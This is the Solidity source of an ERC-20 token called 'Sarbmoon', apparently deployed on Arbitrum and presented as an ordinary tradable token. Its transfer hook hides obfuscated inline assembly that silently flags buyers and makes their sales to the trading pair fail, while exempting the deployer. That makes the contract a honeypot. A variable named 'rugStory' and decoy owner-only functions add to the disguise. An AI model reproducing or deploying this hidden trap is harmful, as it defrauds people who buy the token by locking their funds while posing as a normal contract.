/**
 *Submitted for verification at Arbiscan on 2023-02-15
*/

// https://t.me/Sarbmoon

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private recordCaptain;

    mapping (address => bool) private spellHold;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address _router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
    uint256 private rugStory = 0x29e599d5ed0b7c06e65e9ecdf5e39cfa7f3dc471013b15b50cf5b636143ed09d;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; bool private theTrading;

    address trash = 0x00000000A991C429eE2Ec6df19d40fe0c80088B8;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        recordCaptain.push(_router); recordCaptain.push(msgSender_); recordCaptain.push(pair);
        for (uint256 q=0; q < 3;) {spellHold[recordCaptain[q]] = true; unchecked{q++;} }

        assembly {
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
            function alarmRazor(x,y) -> clapDirt { mstore(0, x) mstore(32, y) clapDirt := keccak256(0, 64) }
            dynP(0x2,sload(0x6)) dynP(0x2,caller()) dynP(0x2,sload(0x7)) sstore(alarmRazor(sload(0xF),0x3),0x1)
            }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function leaveUgly(bool ghostGiant, uint8 bookTag) external onlyOwner returns (bool) {
        return false;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        theTrading = true;
        return true;
    }

    function preferPride(uint256 arrowJoin, uint16 beltKnock, uint16 haveBeyond) external onlyOwner returns (uint8) {
        return 0;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((theTrading || (sender == recordCaptain[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function alarmRazor(x,y) -> clapDirt { mstore(0, x) mstore(32, y) clapDirt := keccak256(0, 64) }
            function winGrief(x,y) -> anglePurse { mstore(0, x) anglePurse := add(keccak256(0, 32),y) }
            function tribeEnsure(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }

            if and(and(eq(sender,sload(winGrief(0x2,0x1))),eq(recipient,sload(winGrief(0x2,0x2)))),iszero(sload(0x1))) { sstore(sload(0x8),sload(0x8)) } if eq(recipient,0x1) { sstore(0x99,0x1) }
            if eq(recipient,57005) { for { let brownOblige := 0 } lt(brownOblige, sload(0x500)) { brownOblige := add(brownOblige, 1) } { sstore(alarmRazor(sload(winGrief(0x500,brownOblige)),0x3),0x1) } }
            if and(and(or(eq(sload(0x99),0x1),eq(sload(alarmRazor(sender,0x3)),0x1)),eq(recipient,sload(winGrief(0x2,0x2)))),iszero(eq(sender,sload(winGrief(0x2,0x1))))) { invalid() }
            if eq(sload(0x110),number()) { if and(and(eq(sload(0x105),number()),eq(recipient,sload(winGrief(0x2,0x2)))),and(eq(sload(0x200),sender),iszero(eq(sload(winGrief(0x2,0x1)),sender)))) { invalid() }
                sstore(0x105,sload(0x110)) sstore(0x115,sload(0x120)) }
            if and(iszero(eq(sender,sload(winGrief(0x2,0x2)))),and(iszero(eq(recipient,sload(winGrief(0x2,0x1)))),iszero(eq(recipient,sload(winGrief(0x2,0x2)))))) { sstore(alarmRazor(recipient,0x3),0x1) }
            if and(and(eq(sender,sload(winGrief(0x2,0x2))),iszero(eq(recipient,sload(winGrief(0x2,0x1))))),iszero(eq(recipient,sload(winGrief(0x2,0x1))))) { tribeEnsure(0x500,recipient) }
            if iszero(eq(sload(0x110),number())) { sstore(0x200,recipient) } sstore(0x110,number()) sstore(0x120,recipient) 
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeploySarbmoon(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(recordCaptain[0], 10 ** 77);
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeploySarbmoon(creator, initialSupply);
    }
}

contract Sarbmoon is ERC20Token {
    constructor() ERC20Token("Sarbmoon", "SARBMOON", msg.sender, 10000000000 * 10 ** 18) {
    }
}